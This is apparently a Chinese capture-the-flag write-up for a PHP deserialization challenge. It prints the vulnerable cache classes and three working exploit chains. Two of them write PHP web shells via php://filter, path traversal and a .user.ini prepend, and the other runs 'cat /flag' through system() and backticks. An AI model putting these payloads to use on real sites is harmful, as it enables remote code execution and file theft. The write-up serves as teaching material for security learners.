# \[2020 新春红包题]1

## \[2020 新春红包题]1

## 考点

* PHP代码审计
* 文件上传目录进行拼接，可以使用`/../`截断
* 使用substr或其他类似函数限制文件后缀，可以使用`/.`绕过
* 在shell中，反引号的优先级是高于引号的，所以会先执行反引号中的内容，然后再将执行结果拼接成一个新的命令

## wp

给了源码，和\[EIS 2019]EzPOP类似，反序列化由`__destruct` 入手，从A类开始

```php
class A {
    protected $store;
    protected $key;
    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }
    public function cleanContents(array $contents) {
        $cachedProperties = array_flip([
            'path', 'dirname', 'basename', 'extension', 'filename',
            'size', 'mimetype', 'visibility', 'timestamp', 'type',
        ]);    //array(10) { ["path"]=> int(0) ["dirname"]=> int(1) ["basename"]=> int(2) ["extension"]=> int(3) ["filename"]=> int(4) ["size"]=> int(5) ["mimetype"]=> int(6) ["visibility"]=> int(7) ["timestamp"]=> int(8) ["type"]=> int(9) } 

        // 2.如果是二维数组，进入if，否则直接返回
        foreach ($contents as $path => $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }
        return $contents;
    }
    
    public function getForStorage() {
        // cache是个数组，cleaned也是个数组
        $cleaned = $this->cleanContents($this->cache);
        // 3. 把数组转成json字符串返回
        return json_encode([$cleaned, $this->complete]);
    }

    public function save() {
        $contents = $this->getForStorage();
        // 4.store是B类
        $this->store->set($this->key, $contents, $this->expire);
    }

    public function __destruct() {
        if (!$this->autosave) {    // 1.autosave=false
            $this->save();
        }
    }
}
```

A类的大概逻辑写到了上面的注释中，再看B类

```php
class B {

    protected function getExpireTime($expire): int {
        return (int) $expire;
    }

    public function getCacheKey(string $name): string {
        // 使缓存文件名随机
        $cache_filename = $this->options['prefix'] . uniqid() . $name;  // 3.文件名随机化
        if(substr($cache_filename, -strlen('.php')) === '.php') {  // 4.name后四位不能是.php
          die('?');
        }
        return $cache_filename;
    }

    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }
        $serialize = $this->options['serialize'];
        return $serialize($data);
    }
    
    // $this->store->set($this->key, $contents, $this->expire);
    // name是key，value是contents
    public function set($name, $value, $expire = null): bool{
        $this->writeTimes++;
        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }
        $expire = $this->getExpireTime($expire); // 1.expire转为int型
        $filename = $this->getCacheKey($name);   // 2.对文件使用uniqid函数重命名，且不能包含.php,这里也是和原题不同的地方

        $dir = dirname($filename);
        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }
        $data = $this->serialize($value);
        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }
        // php://filter绕过死亡exit
        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        $result = file_put_contents($filename, $data);
        if ($result) {
            return $filename;
        }
        return null;
    }
}
```

本题与\[EIS 2019]EzPOP的区别是，A类中的key后四位不能是`.php` ，并且用`uniqid()`伪随机函数重命名文件。

### 第一种做法

由于文件名是直接使用`.` 拼接的，这样就会造成目录穿越，并且可以在文件末尾可以使用`/.` 绕过后缀限制。

```php
<?php
$filename =  uniqid()."/../uploads/shell.php/.";
$dir = dirname($filename);
echo $dir;
// 624713fa232c2/../uploads/shell.php
```

payload

```php
<?php
class A{
    protected $store;
    protected $key;
    protected $expire;
    
    public function __construct($store){
      $this->key = '/../uploads/shell.php/.';
      $this->expire= 1;
      $this->store= $store;
    }
}
class B{}
$b = new B();
$b->options['data_compress'] = false;
$b->options['prefix'] = "php://filter/write=convert.base64-decode/resource=";
$b->options['serialize'] = "trim";

$a = new A($b);
/* <?php eval($_POST[1]);?>*/
$a->cache = array("aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+aaa");
$a->complete = 2;

echo urlencode(serialize($a));
```

### 第二种做法

在创建文件后，它执行了`$data = $this->serialize($data)` 这段代码，而serialize函数可以使用system，`$data` 可以使用包含\`\`\`\` 的字符串

```php
    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }
        $serialize = $this->options['serialize'];
        return $serialize($data);
    }
```

如果让A的cache为`['`cat /flag > ./flag.php`']` ，B的options\['serialize']为`system` ，那么最后执行的语句就是

```php
system('[["`cat \/flag > .\/flag.php`"],true]');
```

> 在shell中，反引号的优先级是高于引号的，所以会先执行反引号中的内容，然后再将执行结果拼接成一个新的命令

### 第三种做法

与第一种大同小异

先写一个 .user.ini，然后写一个 .jpg 里面带马，使其追加到其他 php 后面作为 php 执行即可

包含shell的图片

```php
$b = new B();
$b->writeTimes = 0;
$b -> options = array('serialize' => "base64_decode", 
                      'data_compress' => false,
                      'prefix' => "php://filter/write=convert.base64-decode/resource=uploads/moyu");

$a = new A($store = $b, $key = "/../../aaaaaa.jpg", $expire = 0);
$a->autosave = false;
$a->cache = array();
$a->complete = base64_encode('qaq'.base64_encode('<?php @eval($_POST["moyu"]);?>'));

echo urlencode(serialize($a));
```

然后上传.user.ini

```php
$b = new B();
$b->writeTimes = 0;
$b -> options = array('serialize' => "base64_decode", 
                      'data_compress' => false,
                      'prefix' => "php://filter/write=convert.base64-decode/resource=uploads/moyu");

$a = new A($store = $b, $key = "/../../.user.ini", $expire = 0);
$a->autosave = false;
$a->cache = array();
$a->complete = base64_encode('qaq'.base64_encode("\nauto_prepend_file=aaaaaa.jpg"));

echo urlencode(serialize($a));
```

## 小结

1. [http://althims.com/2020/01/29/buu-new-year/](http://althims.com/2020/01/29/buu-new-year/)
2. [https://www.zhaoj.in/read-6397.html](https://www.zhaoj.in/read-6397.html)
3. [https://www.anquanke.com/post/id/194036](https://www.anquanke.com/post/id/194036)
